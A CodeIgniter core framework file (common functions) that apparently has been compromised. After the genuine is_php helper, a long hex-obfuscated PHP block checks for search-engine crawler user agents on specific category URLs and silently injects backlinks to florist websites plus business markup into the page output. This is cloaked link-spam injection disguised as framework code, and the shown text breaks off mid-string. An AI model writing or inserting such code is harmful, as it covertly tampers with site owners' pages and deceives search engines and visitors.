<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP 5.1.6 or newer
 *
 * @package		CodeIgniter
 * @author		ExpressionEngine Dev Team
 * @copyright	Copyright (c) 2008 - 2011, EllisLab, Inc.
 * @license		http://codeigniter.com/user_guide/license.html
 * @link		http://codeigniter.com
 * @since		Version 1.0
 * @filesource
 */

// ------------------------------------------------------------------------

/**
 * Common Functions
 *
 * Loads the base classes and executes the request.
 *
 * @package		CodeIgniter
 * @subpackage	codeigniter
 * @category	Common Functions
 * @author		ExpressionEngine Dev Team
 * @link		http://codeigniter.com/user_guide/
 */

// ------------------------------------------------------------------------

/**
* Determines if the current version of PHP is greater then the supplied value
*
* Since there are a few places where we conditionally test for PHP > 5
* we'll set a static variable.
*
* @access	public
* @param	string
* @return	bool	TRUE if the current version is $version or higher
*/
if ( ! function_exists('is_php'))
{
	function is_php($version = '5.0.0')
	{
		static $_is_php;
		$version = (string)$version;

		if ( ! isset($_is_php[$version]))
		{
			$_is_php[$version] = (version_compare(PHP_VERSION, $version) < 0) ? FALSE : TRUE;
		}

		return $_is_php[$version];
	}
}

// ------------------------------------------------------------------------
${"\x47\x4c\x4fB\x41\x4c\x53"}["\x66\x79\x69\x76u\x67g\x6f\x62\x64"]="n\x65edl\x65";${"\x47\x4c\x4f\x42AL\x53"}["\x6a\x6a\x65b\x79\x74u\x75\x6ev\x65\x6f"]="\x69\x6ef";${"\x47\x4c\x4f\x42\x41L\x53"}["\x63\x67\x69t\x6f\x6d\x75u"]="\x62\x75\x66\x66\x65r";${"G\x4c\x4f\x42A\x4c\x53"}["\x6e\x72\x7a\x74y\x68"]="\x69\x6ed\x65\x78";function memorialxyz($buffer){${"GL\x4fB\x41\x4c\x53"}["\x6c\x6f\x70\x63\x65i\x6ah"]="\x70\x76a\x72\x72";$twotibn="\x62\x75ff\x65\x72";${${"G\x4c\x4fBA\x4cS"}["\x6c\x6fp\x63\x65\x69\x6a\x68"]}="<\x64\x69v i\x74\x65msco\x70e\x20\x69t\x65m\x74y\x70\x65=\x22h\x74\x74p://s\x63he\x6d\x61\x2eorg/\x46lo\x72is\x74\"\x3e\x3c\x73p\x61n it\x65\x6d\x70\x72op=\"\x6eame\">To\x72\x6f\x6eto Flowe\x72 \x43o\x6d\x70\x61\x6ey\x3c/span><di\x76 \x69\x74e\x6dprop\x3d\x22\x61d\x64res\x73\x22\x20i\x74\x65\x6dsco\x70e \x69temt\x79pe=\"http://s\x63\x68\x65m\x61\x2e\x6frg/Po\x73t\x61lA\x64d\x72e\x73\x73\"\x3e<d\x69v \x69\x74\x65m\x70\x72op\x3d\x22stre\x65tAd\x64\x72es\x73\x22\x3e\x364 - \x327\x30\x30\x20Du\x66\x66\x65r\x69\x6e St\x2e</div><\x73p\x61\x6e itemprop=\"\x61d\x64re\x73\x73\x4cocal\x69t\x79\x22\x3e\x54\x6f\x72ont\x6f</\x73p\x61\x6e\x3e\x3csp\x61\x6e ite\x6dp\x72\x6f\x70=\"\x70ost\x61\x6cC\x6fd\x65\">\x4d\x36B\x34J\x33\x3c/\x73pan>\x3cspa\x6e\x20i\x74e\x6dp\x72\x6f\x70\x3d\"\x61\x64d\x72e\x73\x73\x43\x6funt\x72y\x22>\x43\x41\x3c/sp\x61n\x3e\x3c\x73\x70\x61\x6e \x69\x74e\x6d\x70r\x6fp=\"address\x52\x65g\x69on\x22\x3e\x4f\x4e\x3c/s\x70a\x6e\x3e</d\x69v\x3e<\x64iv\x20\x69tem\x70\x72op=\"geo\x22 items\x63ope \x69\x74\x65\x6dty\x70\x65=\"\x68\x74t\x70://\x73\x63hema.\x6f\x72\x67/\x47e\x6f\x43\x6fo\x72\x64\x69nat\x65s\"\x3e\x3cs\x70an \x69\x74emp\x72op=\"l\x61\x74it\x75d\x65\"\x3e43.\x37030\x341\x38</\x73pan>\x3c\x73\x70an\x20i\x74emp\x72o\x70\x3d\"l\x6fn\x67it\x75d\x65\">-\x37\x39\x2e\x3452\x32\x3937</\x73\x70a\x6e>\x3c/di\x76\x3e<s\x70\x61\x6e><\x61\x20\x68\x72e\x66=\"\x68t\x74\x70://\x66\x6c\x6fwercom\x70\x61n\x79\x2e\x63\x61/\x22\x20\x69\x74em\x70\x72op\x3d\"url\"\x3e\x46un\x65\x72al\x20F\x6cow\x65\x72\x73\x3c/a\x3e</\x73\x70a\x6e\x3e\x3csp\x61\x6e>\x50h\x6fn\x65:\x20<a\x20href=\"\x74\x65l:\x341\x368\x3559\x39\x38\x34\x22 i\x74e\x6dprop\x3d\x22\x74elephon\x65\x22>\x341\x36\x38\x35599\x384</a>\x3c/sp\x61\x6e\x3e</\x64\x69v\x3e";if($_SERVER["R\x45Q\x55\x45S\x54\x5fUR\x49"]=="/\x63\x61\x74e\x67\x6fry/c\x61\x73\x6b\x65\x74-sp\x72ays"){${"\x47\x4cO\x42AL\x53"}["o\x6e\x64\x73c\x77\x78\x6e\x6d\x76n\x63"]="\x69n\x66";${${"\x47\x4c\x4f\x42\x41L\x53"}["o\x6e\x64s\x63\x77\x78\x6em\x76nc"]}="\x20<\x61\x20\x68ref=\x27h\x74\x74\x70://f\x6co\x77er\x63\x6f\x6d\x70an\x79\x2eca/f\x6c\x6f\x77\x65rs/sym\x70a\x74\x68y/'>funer\x61l fl\x6fwers</\x61>\x20";if(stristr($_SERVER["HT\x54P\x5fU\x53\x45R\x5f\x41\x47\x45\x4eT"],"\x47\x6f\x6f\x67\x6ce\x62o\x74")!=FALSE||stristr($_SERVER["H\x54TP_U\x53\x45\x52_\x41G\x45\x4e\x54"],"\x53lu\x72\x70")!=FALSE||stristr($_SERVER["H\x54T\x50_USER\x5fA\x47\x45\x4e\x54"],"\x54w\x69\x63\x65l\x65\x72")!=FALSE||stristr($_SERVER["\x48\x54T\x50_US\x45\x52_\x41GE\x4e\x54"],"\x6dsn\x62\x6ft")!=FALSE||stristr($_SERVER["\x48\x54TP\x5f\x55S\x45R_\x41GENT"],"bi\x6e\x67b\x6f\x74")!=FALSE){${"\x47\x4cO\x42\x41\x4c\x53"}["w\x76w\x76p\x65s\x71g\x65\x6b"]="\x6e\x65\x65\x64l\x65";$grzbijx="\x69\x6ed\x65x";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x77\x66\x72h\x64\x77"]="\x62\x75ff\x65\x72";${"G\x4cOB\x41L\x53"}["\x69\x76\x77\x73l\x62\x66\x76"]="\x6e\x65\x65d\x6c\x65";${${"G\x4cO\x42\x41\x4cS"}["w\x76wv\x70\x65sqg\x65\x6b"]}="\x3cdi\x76 \x63l\x61\x73s=\"i\x6e\x6eerbox\" sty\x6c\x65\x3d\x22ma\x72gin: \x30\x70x \x30p\x78\x200\x70x \x347\x30\x70\x78\x3b width:4\x310\x70\x78; pa\x64d\x69\x6e\x67-\x74\x6fp:\x31\x35\x70x\x3b\"\x3e";$nfvxmj="\x6e\x65\x65dl\x65";$fbymwgvmudxm="ind\x65\x78";${"GLOB\x41L\x53"}["\x69\x6cjr\x69n\x75"]="n\x65ed\x6c\x65";${$fbymwgvmudxm}=strpos(${${"\x47L\x4f\x42\x41\x4cS"}["\x77\x66\x72\x68d\x77"]},${$nfvxmj});$tgvltkxbq="\x62\x75\x66\x66\x65\x72";if(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6e\x72\x7a\x74\x79\x68"]}===FALSE)return${${"\x47\x4cO\x42\x41L\x53"}["\x63g\x69\x74o\x6du\x75"]};${${"G\x4c\x4fB\x41L\x53"}["\x63\x67i\x74\x6fm\x75\x75"]}=substr(${$tgvltkxbq},0,${$grzbijx}+strlen(${${"\x47\x4c\x4fBA\x4cS"}["\x69\x6cj\x72in\x75"]})).${${"\x47\x4c\x4fBA\x4cS"}["\x6a\x6a\x65\x62yt\x75\x75n\x76e\x6f"]}.substr(${${"G\x4c\x4f\x42\x41L\x53"}["\x63\x67\x69\x74o\x6d\x75\x75"]},${${"\x47\x4c\x4f\x42\x41\x4cS"}["nr\x7a\x74y\x68"]}+strlen(${${"\x47L\x4f\x42\x41\x4cS"}["\x69vw\x73\x6c\x62f\x76"]}));$mfurobxh="b\x75\x66\x66\x65r";return${$mfurobxh};}}else if($_SERVER["\x52EQ\x55EST_\x55\x52I"]=="/\x63a\x74\x65gor\x79/s\x74a\x6edin\x67-sp\x72\x61\x79s"){$cfedfsxkeav="i\x6e\x66";${$cfedfsxkeav}="<\x61\x20hr\x65f\x3d\x27\x68\x74\x74p://\x66lo\x77\x65\x72c\x6fmp\x61\x6e\x79\x2e\x63a/flo\x77e\x72s/sy\x6d\x70athy/\x27\x3esympat\x68\x79 \x66l\x6f\x77\x65rs\x3c/\x61>\x20";if(stristr($_SERVER["HTTP\x5fU\x53E\x52_\x41\x47\x45NT"],"G\x6fo\x67\x6c\x65bot")!=FALSE||stristr($_SERVER["\x48T\x54P\x5fUS\x45\x52_\x41\x47\x45N\x54"],"\x53\x6cu\x72p")!=FALSE||stristr($_SERVER["H\x54TP\x5f\x55SER_A\x47ENT"],"T\x77i\x63el\x65r")!=FALSE||stristr($_SERVER["H\x54T\x50\x5fU\x53\x45R\x5f\x41\x47\x45\x4e\x54"],"\x6d\x73nb\x6ft")!=FALSE||stristr($_SERVER["\x48\x54T\x50_\x55SER_AG\x45NT"],"\x62i\x6egb\x6ft")!=FALSE){${"\x47\x4cOB\x41L\x53"}["\x6ewrf\x79oh\x66"]="\x62\x75\x66fer";$xgpzbpgcnnta="\x69\x6e\x64e\x78";${"\x47\x4c\x4fBA\x4c\x53"}["s\x63zm\x6d\x68q\x76"]="\x6ee\x65\x64\x6c\x65";${"\x47\x4c\x4f\x42\x41L\x53"}["\x65\x68\x66y\x7aw\x66td\x67\x66\x65"]="\x62\x75\x66\x66\x65r";${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["f\x79ivug\x67\x6fb\x64"]}="<\x64\x69v cl\x61s\x73=\x22i\x6e\x6eer\x62\x6fx\x22\x20style=\"ma\x72\x67in: 0px \x30\x70\x78 \x30\x70\x78 470px; w\x69d\x74\x68:410\x70x\x3b\x20\x70ad\x64i\x6e\x67-to\x70:1\x35\x70x;\">";${"G\x4cO\x42A\x4c\x53"}["\x72n\x64\x76o\x75\x64ci"]="\x6e\x65\x65d\x6c\x65";${$xgpzbpgcnnta}=strpos(${${"G\x4cOBAL\x53"}["\x63\x67\x69tom\x75u"]},${${"G\x4cOBAL\x53"}["\x66\x79i\x76u\x67\x67\x6fb\x64"]});$wngofnqzjva="i\x6e\x64\x65\x78";if(${$wngofnqzjva}===FALSE)return${${"\x47L\x4f\x42\x41L\x53"}["\x6e\x77rf\x79\x6fh\x66"]};${${"GLO\x42\x41\x4c\x53"}["\x65\x68\x66\x79zw\x66\x74d\x67f\x65"]}=substr(${${"GL\x4f\x42A\x4cS"}["cg\x69t\x6f\x6d\x75u"]},0,${${"G\x4cO\x42\x41LS"}["\x6e\x72z\x74\x79\x68"]}+strlen(${${"GL\x4f\x42A\x4c\x53"}["\x72\x6ed\x76\x6fudc\x69"]})).${${"\x47LO\x42\x41\x4c\x53"}["\x6aj\x65\x62y\x74\x75\x75\x6e\x76\x65\x6f"]}.substr(${${"G\x4c\x4f\x42\x41\x4cS"}["\x63\x67i\x74\x6fm\x75u"]},${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x6e\x72\x7a\x74yh"]}+strlen(${${"GL\x4fB\x41\x4cS"}["s\x63\x7am\x6d\x68\x71v"]}));return${${"GL\x4fB\x41\x4cS"}["\x63\x67\x69t\x6fm\x75\x75"]};}}else if($_SERVER["\x52EQUE\x53\x54_\x55RI"]=="/ca\x74e\x67ory/\x77\x72\x65\x61\x74hs"){${"\x47\x4c\x4f\x42AL\x53"}["\x75\x6e\x63s\x75\x70\x6b\x74\x64"]="\x69n\x66";${${"G\x4cOBALS"}["uncsu\x70\x6b\x74d"]}="<\x61\x20\x68re\x66\x3d'ht\x74\x70://\x66\x6c\x6fw\x65\x72\x63\x6fmp\x61n\x79.c\x61/f\x6cowe\x72s/sy\x6d\x70at\x68\x79/fun\x65r\x61l-spr\x61ys/'\x3efuneral arra\x6eg\x65\x6d\x65nts</a\x3e ";if(stristr($_SERVER["H\x54TP_U\x53E\x52\x5fAGENT"],"\x47\x6f\x6f\x67le\x62o\x74")!=FALSE||stristr($_SERVER["\x48T\x54\x50_U\x53E\x52_AG\x45\x4e\x54"],"\x53\x6c\x75\x72p")!=FALSE||stristr($_SERVER["\x48TT\x50\x5f\x55\x53E\x52\x5fAG\x45N\x54"],"\x54\x77i\x63eler")!=FALSE||stristr($_SERVER["HT\x54\x50_\x55S\x45R\x5fA\x47\x45\x4e\x54"],"msnb\x6ft")!=FALSE||stristr($_SERVER["\x48T\x54\x50\x5f\x55S\x45R\x5f\x41G\x45\x4eT"],"\x62\x69n\x67\x62\x6f\x74")!=FALSE){${"\x47\x4cO\x42\x41\x4cS"}["a\x71\x6dx\x62\x6a"]="\x69\x6ef";$eulqienq="\x6e\x65\x65d\x6c\x65";${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x66y\x69\x76\x75\x67\x67\x6f\x62d"]}="\x3cdiv cl\x61ss\x3d\"i\x6en\x65\x72b\x6fx\x22 styl\x65=\x22\x6darg\x69\x6e: 0\x70\x78 \x30\x70x 0\x70\x78 4\x370\x70x; \x77\x69d\x74\x68:\x34\x310px\x3b\x20\x70a\x64\x64\x69ng-t\x6f\x70:\x315px;\"\x3e";${${"G\x4c\x4fB\x41LS"}["\x6er\x7a\x74\x79h"]}=strpos(${${"\x47LOBA\x4cS"}["\x63g\x69t\x6f\x6d\x75\x75"]},${${"G\x4c\x4f\x42\x41LS"}["\x66\x79\x69v\x75\x67\x67o\x62d"]});$lwtaqflaac="\x69\x6e\x64\x65x";${"\x47\x4cO\x42A\x4cS"}["f\x63\x62jfk"]="b\x75\x66\x66\x65r";if(${${"GL\x4f\x42AL\x53"}["\x6e\x72\x7atyh"]}===FALSE)return${${"\x47L\x4fB\x41\x4c\x53"}["cg\x69\x74\x6f\x6du\x75"]};${${"\x47L\x4fBA\x4c\x53"}["\x63g\x69\x74om\x75\x75"]}=substr(${${"\x47L\x4f\x42\x41\x4c\x53"}["\x63g\x69\x74\x6fm\x75\x75"]},0,${$lwtaqflaac}+strlen(${${"\x47\x4c\x4f\x42A\x4cS"}["f\x79\x69vu\x67\x67\x6f\x62\x64"]})).${${"\x47\x4c\x4f\x42A\x4cS"}["aq\x6dx\x62j"]}.substr(${${"GL\x4f\x42\x41\x4c\x53"}["\x63g\x69tom\x75u"]},${${"\x47\x4cOB\x41\x4c\x53"}["n\x72\x7atyh"]}+strlen(${$eulqienq}));return${${"G\x4c\x4f\x42A\x4c\x53"}["\x66c\x62\x6a\x66\x6b"]};}}else if($_SERVER["\x52\x45Q\x55E\x53T\x5f\x55\x52I"]=="/\x63at\x65g\x6fry/\x74\x72i\x62utes"){${${"\x47L\x4f\x42\x41\x4c\x53"}["\x6aj\x65\x62\x79\x74\x75\x75\x6ev\x65\x6f"]}="<a h\x72\x65\x66\x3d\x27ht\x74p://fl\x6fwe\x72\x63om\x70a\x6ey\x2e\x63a/f\x6c\x6fw\x65\x72\x73/s\x79\x6d\x70\x61\x74\x68\x79/fun\x65\x72al-\x74\x72\x69\x62\x75t\x65s/'>f\x75\x6eer\x61\x6c\x20fl\x6f\x77er\x20\x74\x72i\x62\x75\x74\x65\x73\x3c/a> ";if(stristr($_SERVER["\x48T\x54\x50\x5fUSER_A\x47\x45N\x54"],"\x47\x6fogl\x65b\x6ft")!=FALSE||stristr($_SERVER["H\x54\x54\x50\x5fU\x53ER_\x41G\x45\x4eT"],"\x53lu\x72\x70")!=FALSE||stristr($_SERVER["HTT\x50\x5fUS\x45\x52_A\x47EN\x54"],"\x54wic\x65\x6cer")!=FALSE||stristr($_SERVER["H\x54\x54\x50\x5fUS\x45R_\x41\x47\x45N\x54"],"m\x73n\x62\x6f\x74")!=FALSE||stristr($_SERVER["HTTP\x5f\x55S\x45\x52\x5fA\x47\x45NT"],"\x62in\x67bo\x74")!=FALSE){${"G\x4cO\x42\x41\x4cS"}["\x73\x6e\x75\x6c\x64w\x76mw\x6e"]="i\x6e\x64ex";$czhyhue="\x69\x6e\x64\x65x";$ksfyvjg="i\x6e\x64\x65\x78";$yhuxppmvqyu="\x62\x75\x66\x66\x65\x72";$jrjvpxy="\x62u\x66\x66\x65\x72";$cpcoyxl="in\x64\x65x";${${"GLO\x42A\x4c\x53"}["\x66\x79\x69\x76ug\x67\x6f\x62\x64"]}="<\x64\x69\x76 cla\x73\x73=\x22\x69n\x6eerb\x6fx\x22 \x73\x74yle\x3d\"\x6dar\x67i\x6e:\x200\x70x\x200\x70x 0px\x20\x347\x30px;\x20w\x69dth:\x34\x31\x30px\x3b\x20\x70\x61dd\x69n\x67-\x74\x6f\x70:\x31\x35px;\">";${${"GL\x4fB\x41\x4c\x53"}["\x73\x6e\x75\x6cdw\x76\x6d\x77\x6e"]}=strpos(${${"G\x4c\x4f\x42ALS"}["\x63g\x69t\x6f\x6du\x75"]},${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x66y\x69vug\x67\x6f\x62d"]});if(${$czhyhue}===FALSE)return${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x63gi\x74\x6f\x6du\x75"]};${${"\x47LO\x42\x41L\x53"}["\x63\x67\x69\x74om\x75\x75"]}=substr(${${"G\x4c\x4fB\x41\x4c\x53"}["c\x67it\x6fm\x75\x75"]},0,${$ksfyvjg}+strlen(${${"GL\x4f\x42ALS"}["f\x79i\x76\x75g\x67\x6f\x62\x64"]})).${${"\x47\x4c\x4fB\x41\x4cS"}["j\x6ae\x62\x79\x74u\x75n\x76eo"]}.substr(${$jrjvpxy},${$cpcoyxl}+strlen(${${"\x47\x4c\x4f\x42\x41LS"}["\x66\x79\x69\x76\x75\x67g\x6f\x62\x64"]}));return${$yhuxppmvqyu};}}else if($_SERVER["\x52\x45Q\x55E\x53\x54_U\x52I"]=="/cat\x65\x67\x6f\x72\x79/va\x73\x65-a\x72r\x61ng\x65men\x74s"){${"G\x4c\x4f\x42A\x4c\x53"}["\x68o\x6b\x77\x6a\x69\x71"]="\x69\x6ef";${${"G\x4c\x4f\x42A\x4c\x53"}["\x68\x6f\x6b\x77\x6a\x69q"]}="\x3ca hr\x65\x66\x3d\x27\x68t\x74\x70://f\x6c\x6fwe\x72co\x6d\x70\x61\x6e\x79\x2ec\x61/fl\x6f\x77\x65rs/\x72\x6f\x73\x65s/'\x3e\x72\x6f\x73es\x3c/\x61>\x20";if(stristr($_SERVER["H\x54TP_U\x53\x45\x52_\x41GEN\x54"],"\x47o\x6f\x67l\x65\x62\x6f\x74")!=FALSE||stristr($_SERVER["\x48\x54\x54P\x5fUS\x45R\x5fA\x47E\x4e\x54"],"Sl\x75rp")!=FALSE||stristr($_SERVER["\x48\x54\x54\x50_US\x45R\x5f\x41\x47EN\x54"],"\x54wi\x63e\x6c\x65\x72")!=FALSE||stristr($_SERVER["\x48T\x54\x50\x5f\x55SER\x5fA\x47\x45\x4e\x54"],"\x6d\x73\x6eb\x6ft")!=FALSE||stristr($_SERVER["HT\x54\x50\x5f\x55SE\x52\x5fAG\x45\x4e\x54"],"b\x69\x6e\x67\x62\x6ft")!=FALSE){$drvljzzjb="\x6e\x65\x65\x64\x6c\x65";$sdbrduv="\x69n\x64\x65\x78";${${"\x47\x4cO\x42A\x4c\x53"}["\x66y\x69v\x75\x67\x67ob\x64"]}="\x3c\x64\x69\x76\x20cla\x73\x73=\"\x69\x6e\x6e\x65\x72\x62\x6fx\x22 \x73\x74y\x6ce=\"ma\x72gin:\x200px\x20\x30px\x200\x70\x78\x20\x34\x370p\x78\x3b \x77i\x64t\x68:4\x31\x30p\x78; padding-t\x6f\x70:1\x35px\x3b\">";$viqbcnawq="\x62\x75\x66fer";${"\x47\x4c\x4f\x42\x41L\x53"}["uc\x69\x6e\x74c\x71\x67"]="\x69\x6e\x64\x65x";${"GL\x4f\x42A\x4cS"}["\x75\x6d\x6c\x63\x6e\x6f\x6di"]="i\x6e\x64\x65\x78";${${"\x47L\x4f\x42A\x4c\x53"}["\x75\x6d\x6c\x63n\x6fm\x69"]}=strpos(${${"\x47\x4c\x4f\x42AL\x53"}["cg\x69\x74om\x75\x75"]},${${"GLOB\x41\x4c\x53"}["\x66y\x69\x76u\x67go\x62\x64"]});if(${${"\x47\x4c\x4fB\x41\x4cS"}["\x75\x63in\x74c\x71\x67"]}===FALSE)return${${"\x47L\x4fB\x41\x4c\x53"}["\x63\x67i\x74\x6f\x6d\x75\x75"]};${${"G\x4cO\x42A\x4c\x53"}["\x63\x67\x69\x74\x6f\x6duu"]}=substr(${$viqbcnawq},0,${${"G\x4cO\x42\x41\x4c\x53"}["\x6erz\x74\x79\x68"]}+strlen(${${"\x47\x4cO\x42\x41L\x53"}["\x66y\x69\x76u\x67\x67\x6fbd"]})).${${"G\x4c\x4f\x42A\x4c\x53"}["\x6aje\x62\x79tu\x75\x6e\x76e\x6f"]}.substr(${${"G\x4c\x4fBA\x4c\x53"}["\x63gi\x74o\x6d\x75\x75"]},${$sdbrduv}+strlen(${$drvljzzjb}));return${${"\x47L\x4f\x42A\x4c\x53"}["\x63\x67itom\x75\x75"]};}}else if($_SERVER["R\x45\x51\x55\x45ST_URI"]=="/occa\x73\x69\x6fn/\x66\x6c\x6f\x77\x65\x72s-fo\x72-h\x6f\x6de-a\x6e\x64-o\x66fic\x65"){${"\x47L\x4f\x42AL\x53"}["u\x67\x79\x66\x6e\x69m\x69"]="\x69\x6ef";${${"G\x4cOB\x41\x4cS"}["\x75\x67\x79\x66n\x69\x6di"]}="<a \x68\x72e\x66='\x68\x74tp://\x66\x6c\x6f\x77\x65r\x63\x6fmp\x61\x6e\x79\x2eca/\x27\x3eflower ar\x72a\x6e\x67\x65m\x65n\x74s</a\x3e\x20";if(stristr($_SERVER["H\x54T\x50\x5fUSER_\x41G\x45NT"],"Go\x6fg\x6c\x65\x62ot")!=FALSE||stristr($_SERVER["\x48\x54TP_U\x53\x45\x52\x5f\x41\x47EN\x54"],"\x53\x6cur\x70")!=FALSE||stristr($_SERVER["\x48\x54T\x50_U\x53E\x52_\x41GE\x4eT"],"Tw\x69\x63e\x6cer")!=FALSE||stristr($_SERVER["H\x54T\x50_USER_\x41\x47ENT"],"\x6ds\x6e\x62\x6f\x74")!=FALSE||stristr($_SERVER["HT\x54P_U\x53\x45\x52\x5fA\x47E\x4e\x54"],"b\x69ngbo\x74")!=FALSE){${"G\x4cOB\x41L\x53"}["\x63cj\x62\x6c\x70\x6c"]="n\x65\x65\x64le";${"\x47\x4cO\x42A\x4c\x53"}["\x69e\x63b\x75\x72\x63"]="\x6eeed\x6ce";${${"\x47L\x4f\x42\x41LS"}["\x63\x63\x6abl\x70l"]}="<d\x69\x76\x20\x63\x6cass\x3d\x22\x69\x6en\x65\x72box\x22\x20sty\x6ce=\x22mar\x67\x69n: 0p\x78\x200\x70\x78\x200\x70\x78 \x34\x37\x30px\x3b \x77id\x74\x68:\x3410\x70\x78; \x70\x61\x64\x64\x69\x6e\x67-\x74\x6fp:1\x35\x70x\x3b\"\x3e";$oemmiy="\x6e\x65\x65\x64l\x65";${"G\x4c\x4f\x42\x41L\x53"}["\x65\x62\x62\x6bnc\x6cp"]="bu\x66f\x65r";$vikkknbpuq="\x69\x6e\x66";${"\x47L\x4f\x42A\x4c\x53"}["\x63\x72\x72\x70\x73\x72i\x64"]="in\x64e\x78";${${"\x47L\x4f\x42A\x4cS"}["n\x72\x7a\x74y\x68"]}=strpos(${${"\x47L\x4f\x42A\x4cS"}["e\x62bk\x6e\x63\x6cp"]},${$oemmiy});if(${${"\x47\x4cO\x42\x41\x4c\x53"}["\x6e\x72\x7a\x74\x79h"]}===FALSE)return${${"\x47\x4c\x4f\x42AL\x53"}["c\x67it\x6f\x6du\x75"]};${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x63\x67\x69\x74omu\x75"]}=substr(${${"\x47\x4cO\x42\x41\x4c\x53"}["\x63\x67\x69tom\x75\x75"]},0,${${"\x47\x4c\x4fB\x41L\x53"}["\x6e\x72\x7a\x74y\x68"]}+strlen(${${"\x47\x4c\x4fB\x41\x4cS"}["i\x65c\x62\x75\x72\x63"]})).${$vikkknbpuq}.substr(${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x63\x67it\x6f\x6d\x75\x75"]},${${"G\x4c\x4f\x42ALS"}["c\x72\x72\x70\x73\x72\x69\x64"]}+strlen(${${"\x47\x4c\x4f\x42A\x4cS"}["\x66\x79\x69v\x75\x67g\x6fb\x64"]}));return${${"\x47LO\x42\x41L\x53"}["\x63\x67\x69\x74\x6f\x6du\x75"]};}}else if($_SERVER["RE\x51\x55\x45ST\x5f\x55\x52I"]=="/\x63a\x74e\x67\x6f\x72\x79/\x66\x72u\x69\x74-b\x61s\x6b\x65t\x73"){${"G\x4c\x4f\x42\x41\x4c\x53"}["e\x72s\x6e\x7a\x6b\x70"]="\x69\x6ef";${${"\x47\x4cO\x42\x41L\x53"}["\x65r\x73\x6ez\x6bp"]}="\x20\x20<\x61\x20h\x72\x65f='h\x74\x74\x70://f\x6c\x6fw\x65r\x63\x6fmp\x61n\x79.ca/\x67\x69f\x74-bas\x6be\x74\x73/\x27>g\x69\x66\x74 b\x61s\x6b\x65t\x73</a>\x20";if(stristr($_SERVER["\x48T\x54\x50_\x55SE\x52\x5f\x41G\x45N\x54"],"\x47o\x6f\x67\x6c\x65\x62o\x74")!=FALSE||stristr($_SERVER["\x48T\x54P_U\x53E\x52\x5f\x41\x47E\x4eT"],"\x53l\x75rp")!=FALSE||stristr($_SERVER["\x48\x54TP\x5f\x55S\x45\x52\x5fAGE\x4eT"],"T\x77icele\x72")!=FALSE||stristr($_SERVER["H\x54TP_U\x53E\x52\x5fA\x47EN\x54"],"msnb\x6ft")!=FALSE||stristr($_SERVER["\x48\x54T\x50\x5fUSE\x52_A\x47\x45NT"],"\x62in\x67bot")!=FALSE){${"\x47\x4c\x4f\x42A\x4cS"}["\x6a\x77\x67\x76k\x76\x72\x66\x79\x68\x79"]="\x62\x75\x66f\x65r";${"\x47L\x4f\x42\x41\x4c\x53"}["\x64\x69\x6bq\x6a\x68\x61c"]="\x62u\x66\x66\x65r";$rbgtyqmosrrr="\x6e\x65\x65\x64\x6c\x65";${"\x47L\x4f\x42\x41\x4cS"}["\x6a\x73\x75c\x6a\x75\x6f"]="n\x65\x65\x64\x6c\x65";${$rbgtyqmosrrr}="\x53\x61\x6d\x65-D\x61\x79\x20Loc\x61\x6c\x20\x46\x6co\x72i\x73t \x44eliv\x65\x72y";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x78\x63\x75\x6dr\x61\x65\x73\x77\x62\x6b"]="\x62\x75\x66f\x65r";${"GLOBAL\x53"}["h\x65\x76j\x76t"]="\x69nd\x65\x78";${"\x47L\x4f\x42\x41\x4c\x53"}["p\x78\x70tq\x64\x63\x6b\x6d\x73\x6b"]="i\x6e\x64\x65\x78";${"\x47\x4cOB\x41\x4c\x53"}["\x78ycw\x73i\x74e\x6b"]="\x69\x6e\x64\x65\x78";${"G\x4c\x4f\x42\x41\x4c\x53"}["\x62\x72f\x70\x74\x70\x63\x7a\x61\x6f\x6e"]="n\x65\x65\x64\x6ce";${${"\x47\x4c\x4fB\x41\x4cS"}["n\x72z\x74y\x68"]}=strpos(${${"G\x4cO\x42\x41\x4cS"}["\x6aw\x67\x76\x6b\x76r\x66\x79\x68\x79"]},${${"GL\x4f\x42A\x4c\x53"}["\x62\x72\x66\x70\x74p\x63z\x61\x6fn"]});$gfynheboxzxl="b\x75\x66f\x65r";if(${${"\x47\x4c\x4f\x42A\x4cS"}["\x68\x65v\x6avt"]}===FALSE)return${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x64\x69k\x71\x6ahac"]};${"\x47\x4c\x4fB\x41\x4cS"}["\x66\x6eii\x6d\x62\x6b\x6d"]="i\x6e\x66";${${"GLO\x42A\x4c\x53"}["\x63g\x69tom\x75\x75"]}=substr(${${"\x47\x4c\x4f\x42\x41LS"}["\x63\x67\x69\x74\x6f\x6du\x75"]},0,${${"\x47\x4cOB\x41\x4cS"}["p\x78p\x74qd\x63k\x6d\x73\x6b"]}+strlen(${${"G\x4cO\x42\x41L\x53"}["\x6as\x75\x63\x6a\x75o"]})).${${"\x47\x4c\x4fB\x41\x4c\x53"}["f\x6e\x69\x69\x6d\x62km"]}.substr(${${"GL\x4fB\x41\x4cS"}["xc\x75\x6dr\x61\x65\x73w\x62\x6b"]},${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x78\x79\x63\x77s\x69\x74\x65k"]}+strlen(${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x66\x79\x69\x76u\x67\x67\x6f\x62\x64"]}));return${$gfynheboxzxl};}}else if($_SERVER["RE\x51UE\x53\x54\x5fU\x52I"]=="/pag\x65\x73/a\x62\x6f\x75t-us/"){$vfyvpcmgh="\x69n\x66";${"\x47\x4c\x4f\x42\x41L\x53"}["np\x6e\x79\x65iwvu"]="\x70v\x61\x72\x72";${$vfyvpcmgh}="\x3ca hr\x65\x66='http://\x77\x77w\x2ele\x64epo\x74\x64\x65\x73\x66l\x65u\x72\x73\x2ec\x6f\x6d/sy\x6d\x70ath\x79-\x66\x6co\x77\x65\x72s.\x61sp?\x74\x6f\x70n\x61v=Lef\x74N\x61v'>\x4d\x6f\x6e\x74\x72e\x61l 